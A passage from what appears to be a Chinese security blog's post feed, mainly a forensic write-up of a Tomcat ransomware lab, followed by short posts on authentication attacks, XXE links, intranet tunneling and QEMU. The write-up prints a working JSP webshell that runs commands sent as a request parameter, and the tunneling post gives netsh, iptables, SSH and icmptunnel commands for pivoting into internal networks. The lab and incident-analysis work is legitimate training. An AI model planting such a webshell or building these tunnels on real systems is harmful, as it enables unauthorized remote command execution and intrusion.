+<h2 id="scp-传输文件"><a href="#scp-传输文件" class="headerlink" title="scp 传输文件"></a>scp 传输文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~/history# scp history.txt kali@192.168.80.129:/home/kali/Desktop</span><br><span class="line">The authenticity of host &#x27;192.168.80.129 (192.168.80.129)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:ms0GOphjxpGNpSvxPadaF3Bwf8hg7vUA8sXv4ojqDwo.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.80.129&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">kali@192.168.80.129&#x27;s password: </span><br><span class="line">history.txt                                                                                                    100% 5816     4.2MB/s   00:00    </span><br></pre></td></tr></table></figure>
+<h2 id="分析历史记录"><a href="#分析历史记录" class="headerlink" title="分析历史记录"></a>分析历史记录</h2><p>第一部分是apache的tomcat环境搭建，第二部分是模拟黑客的勒索病毒加密攻击<br>将上传的vulntargetn.jsp改名未404.jsp<br>历史记录显示的敏感文件：<br>get_pem.py<br>encrypt_vulntarget.py<br>flag.jsp<br>pubkey.pem<br>privkey.pem<br>localhost_access_log.2024-06-04.txt</p>
+<div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">历史记录</button><button type="button" class="tab">历史记录分析</button><button type="button" class="tab">路径操作</button></div><div class="tab-contents"><div class="tab-item-content active"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1      1  apt update &amp;&amp; apt install openjdk-8-jdk &amp;&amp; apt install unzip -y</span><br><span class="line">   2      2  vim /etc/profile</span><br><span class="line">   3      3  source /etc/profile</span><br><span class="line">   4      4  wget https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.zip</span><br><span class="line">   5      5  unzip apache-tomcat-7.0.79.zip</span><br><span class="line">   6      6  mv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcat</span><br><span class="line">   7      7  mv apache-tomcat-7.0.79 /opt/tomcat</span><br><span class="line">   8      8  chmod +x /opt/tomcat/bin/*.sh</span><br><span class="line">   9      9  ls</span><br><span class="line">  10     10  history </span><br><span class="line">  11     11  flag&#123;vulntarget_very_G00d&#125;</span><br><span class="line">  12     12  /opt/tomcat/bin/startup.sh</span><br><span class="line">  13     13  cp /opt/tomcat/conf/server.xml /opt/tomcat/conf/server.xml.bak</span><br><span class="line">  14     14  vim /opt/tomcat/conf/server.xml</span><br><span class="line">  15     15  ps -axu | grep tomcat</span><br><span class="line">  16     16  kill -9 6961</span><br><span class="line">  17     17  /opt/tomcat/bin/startup.sh</span><br><span class="line">  18     18  cp web.xml web.xml.bak</span><br><span class="line">  19     19  pwd </span><br><span class="line">  20     20  cd ..</span><br><span class="line">  21     21  ls</span><br><span class="line">  22     22  cd /opt/</span><br><span class="line">  23     23  ls</span><br><span class="line">  24     24  cd tomcat/</span><br><span class="line">  25     25  ls</span><br><span class="line">  26     26  cd conf/</span><br><span class="line">  27     27  cp web.xml web.xml.bak</span><br><span class="line">  28     28  vim web.xml</span><br><span class="line">  29     29  ps -axu | grep tomcat</span><br><span class="line">  30     30  kill -9 7409</span><br><span class="line">  31     31  /opt/tomcat/bin/startup.sh</span><br><span class="line">  32     32  pwd </span><br><span class="line">  33     33  cd ..</span><br><span class="line">  34     34  ls</span><br><span class="line">  35     35  cd webapps/</span><br><span class="line">  36     36  ls</span><br><span class="line">  37     37  cd ROOT/</span><br><span class="line">  38     38  ls</span><br><span class="line">  39     39  rm favicon.ico </span><br><span class="line">  40     40  cp index.jsp index.jsp.bak</span><br><span class="line">  41     41  ls</span><br><span class="line">  42     42  vim index.jsp</span><br><span class="line">  43     43  rm index.jsp</span><br><span class="line">  44     44  vim index.jsp</span><br><span class="line">  45     45  crontab -e</span><br><span class="line">  46     46  history </span><br><span class="line">  47     47  ls</span><br><span class="line">  48     48  mv vulntargetn.jsp 404.jsp</span><br><span class="line">  49     49  ls</span><br><span class="line">  50     50  rm index.jsp.bak</span><br><span class="line">  51     51  pip3 install rsa</span><br><span class="line">  52     52  ls</span><br><span class="line">  53     53  ls -lha</span><br><span class="line">  54     54  mkdir .vulntarget</span><br><span class="line">  55     55  cd .vulntarget/</span><br><span class="line">  56     56  ls</span><br><span class="line">  57     57  mkdir keys</span><br><span class="line">  58     58  ls</span><br><span class="line">  59     59  history </span><br><span class="line">  60     60  ls</span><br><span class="line">  61     61  vim get_pem.py</span><br><span class="line">  62     62  python3 get_pem.py </span><br><span class="line">  63     63  ls</span><br><span class="line">  64     64  rm get_pem.py </span><br><span class="line">  65     65  ls</span><br><span class="line">  66     66  cd ..</span><br><span class="line">  67     67  ls</span><br><span class="line">  68     68  cp .vulntarget/keys/pubkey.pem .</span><br><span class="line">  69     69  ls</span><br><span class="line">  70     70  ls | grep jsp</span><br><span class="line">  71     71  vim encrypt_vulntarget.py</span><br><span class="line">  72     72  ls</span><br><span class="line">  73     73  vim flag.jsp</span><br><span class="line">  74     74  ls | grep jsp</span><br><span class="line">  75     75  python3 encrypt_vulntarget.py </span><br><span class="line">  76     76  ls</span><br><span class="line">  77     77  cd .vulntarget/</span><br><span class="line">  78     78  ls</span><br><span class="line">  79     79  cd keys/</span><br><span class="line">  80     80  ls</span><br><span class="line">  81     81  cat pubkey.pem </span><br><span class="line">  82     82  cat privkey.pem </span><br><span class="line">  83     83  cd ..</span><br><span class="line">  84     84  ls</span><br><span class="line">  85     85  cd ..</span><br><span class="line">  86     86  ls</span><br><span class="line">  87     87  rm encrypt_vulntarget.py </span><br><span class="line">  88     88  rm pubkey.pem </span><br><span class="line">  89     89  ls</span><br><span class="line">  90     90  vim index.jsp</span><br><span class="line">  91     91  ls</span><br><span class="line">  92     92  cd ..</span><br><span class="line">  93     93  ls</span><br><span class="line">  94     94  cd ..</span><br><span class="line">  95     95  ls</span><br><span class="line">  96     96  cd logs/</span><br><span class="line">  97     97  ls</span><br><span class="line">  98     98  cat localhost_access_log.2024-06-04.txt </span><br><span class="line">  99     99  vim localhost_access_log.2024-06-04.txt </span><br><span class="line"> 100    100  ls</span><br><span class="line"> 101    101  vim localhost_access_log.2024-06-04.txt </span><br><span class="line"> 102    102  ls</span><br><span class="line"> 103    103  history </span><br><span class="line"> 104    104  curl http://127.0.0.1</span><br><span class="line"> 105    105  ls</span><br><span class="line"> 106    106  cd </span><br><span class="line"> 107    107  ls</span><br><span class="line"> 108    108  ls -lha</span><br><span class="line"> 109    109  cat .bashrc </span><br><span class="line"> 110    110  ls</span><br><span class="line"> 111    111  history &gt; .bash_history</span><br></pre></td></tr></table></figure></div><div class="tab-item-content"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">安装openjdk和unzip命令工具</span><br><span class="line"></span><br><span class="line">下载apache压缩包并解压</span><br><span class="line"></span><br><span class="line">tomcat/bin下sh文件赋权</span><br><span class="line"></span><br><span class="line">有个flag flag&#123;vulntarget_very_G00d&#125;</span><br><span class="line"></span><br><span class="line">配置apache服务器</span><br><span class="line"></span><br><span class="line">打开定时任务并编辑(待会康康定时任务都有啥)</span><br><span class="line"></span><br><span class="line">安装rsa(看起来是准备加密了)</span><br><span class="line"></span><br><span class="line">ls -lha查看当前目录下详细信息</span><br><span class="line"></span><br><span class="line">创建隐藏文件夹.vulntarget</span><br><span class="line">创建key文件夹</span><br><span class="line"></span><br><span class="line">创建 get_pem.py(似乎是rsa创建密钥的代码)</span><br><span class="line"></span><br><span class="line">python 运行 get_pem.py</span><br><span class="line"></span><br><span class="line">删除get_pem.py</span><br><span class="line"></span><br><span class="line">ls | grep jsp查看所有名称包含jsp的文件</span><br><span class="line"></span><br><span class="line">创建encrypt_vulntarget.py(似乎是加密代码)</span><br><span class="line"></span><br><span class="line">创建flag.jsp</span><br><span class="line"></span><br><span class="line">python3 运行encrypt_vulntarget.py</span><br><span class="line"></span><br><span class="line">查看生成的公钥和私钥</span><br><span class="line">cat pubkey.pem </span><br><span class="line">cat privkey.pem </span><br><span class="line"></span><br><span class="line">删除 encrypt_vulntarget.py和pubkey.pem</span><br><span class="line"></span><br><span class="line">编辑localhost_access_log.2024-06-04.txt日志文件</span><br><span class="line"></span><br><span class="line">curl http://127.0.0.1</span><br></pre></td></tr></table></figure></div><div class="tab-item-content"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">cd /opt/</span><br><span class="line"></span><br><span class="line">cd tomcat/</span><br><span class="line"></span><br><span class="line">cd conf/</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">cd webapps/</span><br><span class="line"></span><br><span class="line">cd ROOT/</span><br><span class="line"></span><br><span class="line">ROOT下创建.vulntarget文件夹</span><br><span class="line"></span><br><span class="line">cd .vulntarget/ mkdir keys</span><br><span class="line"></span><br><span class="line">创建get_pem.py</span><br><span class="line">运行get_pem.py 生成了pubkey和privkey</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">ROOT目录下cp .vulntarget/keys/pubkey.pem .</span><br><span class="line"></span><br><span class="line">ROOT目录下创建 encrypt_vulntarget.py</span><br><span class="line"></span><br><span class="line">创建 flag.jsp</span><br><span class="line"></span><br><span class="line">加密 python3 encrypt_vulntarget.py </span><br><span class="line"></span><br><span class="line">cd .vulntarget/</span><br><span class="line"></span><br><span class="line">cd keys/</span><br><span class="line"></span><br><span class="line">cat查看pubkey和privkey</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">ROOT目录下删除encrypt_vulntarget.py</span><br><span class="line"></span><br><span class="line">删除pubkey</span><br><span class="line"></span><br><span class="line">cd..</span><br><span class="line"></span><br><span class="line">cd..</span><br><span class="line"></span><br><span class="line">cd logs/</span><br></pre></td></tr></table></figure></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>
+<h2 id="痕迹"><a href="#痕迹" class="headerlink" title="痕迹"></a>痕迹</h2><p>看看是否有遗留文件<br>存在公钥和私钥以及发现可疑jsp文件后缀vulntarget<br>结合项目背景可确认加密后缀为vulntarget，加密目录为&#x2F;opt&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~# find / -iname &quot;*pubkey*&quot;</span><br><span class="line">/usr/lib/crda/pubkeys</span><br><span class="line">/opt/tomcat/webapps/ROOT/.vulntarget/keys/pubkey.pem</span><br><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~# find / -iname &quot;*privkey*&quot;</span><br><span class="line">/opt/tomcat/webapps/ROOT/.vulntarget/keys/privkey.pem</span><br><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~# find / -iname &quot;*get_pem*&quot;</span><br><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~# find / -iname &quot;*encrypt_vulntarget*&quot;</span><br><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~# find / -iname &quot;*flag.jsp*&quot;</span><br><span class="line">/opt/tomcat/webapps/ROOT/flag.jsp.vulntarget</span><br><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~# find / -iname &quot;*localhost_access_log。2024-06.*&quot;</span><br><span class="line">/opt/tomcat/logs/localhost_access_log.2024-06-04.txt</span><br></pre></td></tr></table></figure>
+<h2 id="勒索解密"><a href="#勒索解密" class="headerlink" title="勒索解密"></a>勒索解密</h2><h2 id="分析localhost-access-log日志"><a href="#分析localhost-access-log日志" class="headerlink" title="分析localhost_access_log日志"></a>分析localhost_access_log日志</h2><p>日志太长不做展示</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@iZj6c6hytildlalnu0cwt4Z:/opt/tomcat/logs# cat localhost_access_log.2024-06-04.txt</span><br></pre></td></tr></table></figure>
+<p>日志查看发现上传了两个可疑文件<br><img src="/img/vulntargetN/put.png"><br>搜索文件位置</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~# find / -type f -iname vulntarget.jsp*</span><br><span class="line">/opt/tomcat/webapps/ROOT/vulntarget.jsp.vulntarget</span><br></pre></td></tr></table></figure>
+<p>查看&#x2F;opt&#x2F;tomcat&#x2F;webapps&#x2F;ROOT下的文件<br>发现当前目录下被加密的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">404.jsp.vulntarget</span><br><span class="line">flag.jsp.vulntarget</span><br><span class="line">index.jsp.vulntarget</span><br><span class="line">vulntarget.jsp.vulntarget</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~# cd /opt/tomcat/webapps/ROOT/</span><br><span class="line">root@iZj6c6hytildlalnu0cwt4Z:/opt/tomcat/webapps/ROOT# ll</span><br><span class="line">total 188</span><br><span class="line">drwxr-xr-x 4 root root  4096 Jun  4 14:38 ./</span><br><span class="line">drwxr-xr-x 7 root root  4096 Jun 26  2017 ../</span><br><span class="line">-rw-r--r-- 1 root root   684 Jun  4 14:37 404.jsp.vulntarget</span><br><span class="line">-rw-r--r-- 1 root root 26726 Jun 26  2017 asf-logo-wide.svg</span><br><span class="line">-rw-r--r-- 1 root root   713 Jun 26  2017 bg-button.png</span><br><span class="line">-rw-r--r-- 1 root root  1918 Jun 26  2017 bg-middle.png</span><br><span class="line">-rw-r--r-- 1 root root  1392 Jun 26  2017 bg-nav-item.png</span><br><span class="line">-rw-r--r-- 1 root root  1401 Jun 26  2017 bg-nav.png</span><br><span class="line">-rw-r--r-- 1 root root  3103 Jun 26  2017 bg-upper.png</span><br><span class="line">-rw-r--r-- 1 root root   172 Jun  4 14:37 flag.jsp.vulntarget</span><br><span class="line">-rw-r--r-- 1 root root   881 Jun  4 14:38 index.jsp</span><br><span class="line">-rw-r--r-- 1 root root  3244 Jun  4 14:37 index.jsp.vulntarget</span><br><span class="line">-rw-r--r-- 1 root root  9195 Jun 26  2017 RELEASE-NOTES.txt</span><br><span class="line">-rw-r--r-- 1 root root  5931 Jun 26  2017 tomcat.css</span><br><span class="line">-rw-r--r-- 1 root root  2066 Jun 26  2017 tomcat.gif</span><br><span class="line">-rw-r--r-- 1 root root  5103 Jun 26  2017 tomcat.png</span><br><span class="line">-rw-r--r-- 1 root root  2376 Jun 26  2017 tomcat-power.gif</span><br><span class="line">-rw-r--r-- 1 root root 68761 Jun 26  2017 tomcat.svg</span><br><span class="line">drwxr-xr-x 3 root root  4096 Jun  4 14:35 .vulntarget/</span><br><span class="line">-rw-r--r-- 1 root root   172 Jun  4 14:37 vulntarget.jsp.vulntarget</span><br><span class="line">drwxr-xr-x 2 root root  4096 Jun 26  2017 WEB-INF/</span><br></pre></td></tr></table></figure>
+
+<h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>通过历史记录分析以及命令搜索可知加密的公钥和私钥未被删除，生成的密钥为pubkey.pem和privkey.pem<br>使用相关工具进行解密文件：<br>flag.jsp<br><img src="/img/vulntargetN/flag.png"><br>vulntarget.jsp<br><img src="/img/vulntargetN/hack.png"><br>404.jsp.vulntarget</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;vulntarget&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="攻击路径分析"><a href="#攻击路径分析" class="headerlink" title="攻击路径分析"></a>攻击路径分析</h1><h2 id="access-log日志分析"><a href="#access-log日志分析" class="headerlink" title="access_log日志分析"></a>access_log日志分析</h2><p>04&#x2F;Jun&#x2F;2024 14:31:18 通过apache tomcat PUT任意文件上传漏洞上传vulntarget.jsp<br>04&#x2F;Jun&#x2F;2024 14:33:37 通过apache tomcat PUT任意文件上传漏洞上传vulntargetn.jsp<br>(为防止靶场制作者信息泄露未执行反弹shell)<br>04&#x2F;Jun&#x2F;2024 14:33:57 GET请求路径 &#x2F;vulntargetn.jsp?pwd&#x3D;vulntarget&amp;i&#x3D;whoami 成功</p>
+<h2 id="历史命令分析"><a href="#历史命令分析" class="headerlink" title="历史命令分析"></a>历史命令分析</h2><p>opt&#x2F;tomcat&#x2F;webapps&#x2F;ROOT目录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm vulntargetn.jsp 404.jsp</span><br><span class="line">pip3 install rsa</span><br><span class="line">mkdir .vulntarget</span><br><span class="line">cd .vulntarget/</span><br></pre></td></tr></table></figure>
+<p>opt&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;.vulntarget目录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir keys</span><br><span class="line">cd keys</span><br></pre></td></tr></table></figure>
+<p>opt&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;.vulntarget&#x2F;keys目录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim get_pem.py</span><br><span class="line">python3 get_pem.py</span><br><span class="line">rm get_pem.py</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>
+<p>opt&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;.vulntarget目录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp .vulntarget/keys/pubkey.pem .</span><br><span class="line">ls | grep jsp</span><br><span class="line">vim encrypt_vulntarget.py</span><br><span class="line">python3 encrypt_vulntarget.py</span><br><span class="line">rm encrypt_vulntarget.py</span><br><span class="line">rm pubkey.pem</span><br><span class="line">cd ../../logs/</span><br></pre></td></tr></table></figure>
+<p>opt&#x2F;tomcat&#x2F;logs目录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim localhost_access_log.2024-06-04.txt</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>恶意软件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web认证机制与攻击方式</title>
+    <url>/posts/65c9aba7.html</url>
+    <content><![CDATA[<p><a href="https://websec.readthedocs.io/zh/latest/auth/index.html">认证机制</a></p>
+<h1 id="http-basic-auth-http-基础授权-早期"><a href="#http-basic-auth-http-基础授权-早期" class="headerlink" title="http basic auth (http 基础授权 早期)"></a>http basic auth (http 基础授权 早期)</h1><p>访问url请求头需包含用户名和密码<br>若未收到http basic auth 返回401，并返回basic值的请求头www-authenticate及参数realm<br>如apache后台访问会跳一个要求输入账密的弹窗，抓包发现请求头的authentication: basic 一串密文，这串密文为base64加密<br><a href="https://fastapi.tiangolo.com/zh/advanced/security/http-basic-auth/#_4">HTTP基础授权</a></p>
+<h1 id="MFA-Multi-Factor-Authentication-多因子认证"><a href="#MFA-Multi-Factor-Authentication-多因子认证" class="headerlink" title="MFA (Multi-Factor Authentication 多因子认证)"></a>MFA (Multi-Factor Authentication 多因子认证)</h1><p>即多种方式对用户身份进行验证。<br>在web端的多因子认证能大大提高系统安全，但在部分系统中，不同因子的认证可能互不相关，或因为代码逻辑缺陷导致存在漏洞。<br><a href="https://web-sec.gitbook.io/wsa/server-side/authentication/multi-factor">多因素认证中的漏洞</a></p>
+<h1 id="SSO-Single-Sign-On"><a href="#SSO-Single-Sign-On" class="headerlink" title="SSO (Single Sign On)"></a>SSO (Single Sign On)</h1><p>一个用户可以通过单一的ID和凭证（密码）访问多个相关但彼此独立的系统<br><a href="https://xz.aliyun.com/t/13848?u_atoken=d49d5dca49ffa2ce7464a3d509241079&u_asig=1a0c399a17276105611338740e012d">从SSO认证缺陷到任意用户登录漏洞</a></p>
+<h1 id="JWT令牌-Json-Web-Token"><a href="#JWT令牌-Json-Web-Token" class="headerlink" title="JWT令牌 (Json Web Token)"></a>JWT令牌 (Json Web Token)</h1><p>常用于分布式站点的SSO场景<br><a href="https://www.v0n.top/2019/11/01/%E6%B5%85%E8%B0%88JWT%E7%BB%95%E8%BF%87/">浅谈JWT绕过</a></p>
+<h1 id="Oauth2"><a href="#Oauth2" class="headerlink" title="Oauth2"></a>Oauth2</h1><p>OAuth2.0 是一个被广泛使用的授权框架。能满足网站和WEB程序对另一个应用程序上用户账户数据的有限访问。允许用户在不公开登陆账号密码等凭据的情况下，授权第三方访问权限，实现不同应用间的账户认证。<br><a href="https://xz.aliyun.com/t/13349?u_atoken=90475d2a0b9fa049a3c8a0e2e2aaeb7e&u_asig=1a0c384b17276185334966303e0049">OAuth 2.0认证缺陷刨析</a></p>
+<h1 id="SAML-Security-Assertion-Markup-Language-安全断言标记语言"><a href="#SAML-Security-Assertion-Markup-Language-安全断言标记语言" class="headerlink" title="SAML (Security Assertion Markup Language 安全断言标记语言)"></a>SAML (Security Assertion Markup Language 安全断言标记语言)</h1><p>XML格式的语言，使用XML格式交互，来完成SSO的功能<br><a href="https://www.freebuf.com/articles/system/361055">五分钟学会SAML协议漏洞的发现与利用</a><br>(小声逼逼: 最近Gitlab有这个洞，exp未公开)</p>
+<h1 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h1><p>内网渗透避不开的认证<br><a href="https://xz.aliyun.com/t/14534">内网渗透-Kerberos认证流程详解</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>认证机制与攻击</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xxe漏洞及原理</title>
+    <url>/posts/e69865a1.html</url>
+    <content><![CDATA[<p><a href="https://blog.csdn.net/elephantxiang/article/details/113812331">pikachu XXE (XML外部实体注入)</a><br><a href="https://lalajun.github.io/2019/12/03/WEB-XXE/">WEB-XXE (lalajun.github.io)</a><br><a href="https://www.freebuf.com/articles/web/177979.html">XXE漏洞利用技巧：从XML到远程代码执行</a><br><a href="https://blog.csdn.net/m0_54546762/article/details/119181068">dtd元素定义和属性定义</a></p>
+]]></content>
+      <tags>
+        <tag>XXE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网隧道搭建</title>
+    <url>/posts/d57d5540.html</url>
+    <content><![CDATA[<h1 id="网络连通性测试"><a href="#网络连通性测试" class="headerlink" title="网络连通性测试"></a>网络连通性测试</h1><h2 id="icmp探测"><a href="#icmp探测" class="headerlink" title="icmp探测"></a>icmp探测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 114.114.114.114 -n 1	#Windows</span><br><span class="line">ping 114.114.114.114 -c 1	#Linux</span><br></pre></td></tr></table></figure>
+<h2 id="http探测"><a href="#http探测" class="headerlink" title="http探测"></a>http探测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://www.baidu.com</span><br></pre></td></tr></table></figure>
+<h2 id="dns探测"><a href="#dns探测" class="headerlink" title="dns探测"></a>dns探测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup baidu.com</span><br></pre></td></tr></table></figure>
+<h1 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h1><p>服务器可出网<br>反向代理可穿透防火墙<br>cobaltstrike socks代理<br>nps工具</p>
+<h1 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h1><h2 id="windows-netsh-端口转发-双网卡"><a href="#windows-netsh-端口转发-双网卡" class="headerlink" title="windows netsh 端口转发 双网卡"></a>windows netsh 端口转发 双网卡</h2><p>netsh仅支持tcp协议，适用于双网卡服务器<br>启动转发</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看已有规则</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line">添加转发规则 访问外网ip1234端口即访问内网ip端口3389</span><br><span class="line">netsh interface portproxy set v4tov4 listenaddress=外网IP listenport=1234 connectaddress=内网IP connectport=3389 </span><br></pre></td></tr></table></figure>
+<p>取消转发</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">删除转发规则</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=1234</span><br><span class="line"></span><br><span class="line"># xp需安装ipv4</span><br><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure>
+<h2 id="linux-iptables-转发-高权限"><a href="#linux-iptables-转发-高权限" class="headerlink" title="linux iptables 转发 高权限"></a>linux iptables 转发 高权限</h2><p>编辑配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开启IP转发</span><br><span class="line">vi /etc/sysctl.conf</span><br><span class="line">	net.ipv4.ip_forward = 1</span><br></pre></td></tr></table></figure>
+<p>关闭服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service iptables stop</span><br></pre></td></tr></table></figure>
+<p>配置规则</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#需要访问的内网地址：10.1.1.11（Windows）</span><br><span class="line">#内网边界web服务器：192.168.100.100（Linux）</span><br><span class="line">iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-source 192.168.100.100</span><br></pre></td></tr></table></figure>
+<p>保存并重启服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service iptables save &amp;&amp; service iptables start</span><br></pre></td></tr></table></figure>
+<h2 id="neo-regeorg端口复用"><a href="#neo-regeorg端口复用" class="headerlink" title="neo-regeorg端口复用"></a>neo-regeorg端口复用</h2><p>下载<a href="https://github.com/L-codes/Neo-reGeorg">neo-regeorg</a></p>
+<h1 id="linux-ssh隧道-高权限"><a href="#linux-ssh隧道-高权限" class="headerlink" title="linux ssh隧道 高权限"></a>linux ssh隧道 高权限</h1><h2 id="本地转发-正向"><a href="#本地转发-正向" class="headerlink" title="本地转发 正向"></a>本地转发 正向</h2><p>vps执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -L &lt;VPS监听端口&gt;:&lt;目标内网IP&gt;:&lt;目标端口&gt; &lt;（root@目标外网Web服务器，会要求输入密码）&gt;</span><br><span class="line"></span><br><span class="line">ssh -CfNg -L 8080:10.1.1.3:3389 root@100.100.1.100</span><br><span class="line"></span><br><span class="line">#VPS上查看8090端口是否已经连接</span><br><span class="line">netstat -tulnp | grep &quot;8090&quot;</span><br><span class="line"></span><br><span class="line">#连接目标内网服务器的远程桌面</span><br><span class="line">VPS-IP:8090</span><br></pre></td></tr></table></figure>
+<h2 id="远程转发-反向"><a href="#远程转发-反向" class="headerlink" title="远程转发 反向"></a>远程转发 反向</h2><p>web服务器执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -R &lt;VPS的端口&gt;:&lt;目标内网IP&gt;:&lt;目标端口&gt; &lt;（root@VPS-IP，会要求输入密码）&gt;</span><br><span class="line"></span><br><span class="line">ssh -CfNg -R 8090:10.1.1.3:3389 root@192.168.0.1</span><br></pre></td></tr></table></figure>
+<h1 id="icmp加密隧道"><a href="#icmp加密隧道" class="headerlink" title="icmp加密隧道"></a>icmp加密隧道</h1><p>icmp可出网</p>
+<p>linux: icmptunnel<br>服务端安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/jamesbarlow/icmptunnel.git</span><br><span class="line">cd icmptunnel/</span><br><span class="line">make</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1	#禁用自带的ICMP，两端都要</span><br><span class="line">./icmptunnel -s 							#服务端以root用户监听</span><br><span class="line">(ctrl-z)									</span><br><span class="line">bg											#后台挂起</span><br><span class="line">ifconfig tun0 10.0.0.1 netmask 255.255.255.0#给隧道接口分配一个 IP 地址</span><br></pre></td></tr></table></figure>
+<p>客户端连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./icmptunnel &lt;server-IP&gt;</span><br><span class="line">(ctrl-z)</span><br><span class="line">bg											#后台挂起</span><br><span class="line">ifconfig tun0 10.0.0.2 netmask 255.255.255.0#给隧道接口分配一个 IP 地址</span><br></pre></td></tr></table></figure>
+<p>测试ssh连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@10.0.0.1</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Intranet安全</category>
+      </categories>
+      <tags>
+        <tag>内网穿透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>QEMU镜像格式转换工具</title>
+    <url>/posts/41bf34a5.html</url>
+    <content><![CDATA[<h1 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h1><p>qemu-img工具支持RAW、QCOW2、QCOW1、VMDK、VDI、VHD、VHDX或QED格式的镜像相互转换。<br>qemu-img工具不支持直接将ISO镜像转换为RAW、VHD和QCOW2格式。<br>将VHD格式转换为其他格式或者将其他文件格式转换为VHD格式时，需使用vpc参数代替VHD格式，否则可能造成qemu-img工具无法识别VHD镜像格式导致转换失败</p>
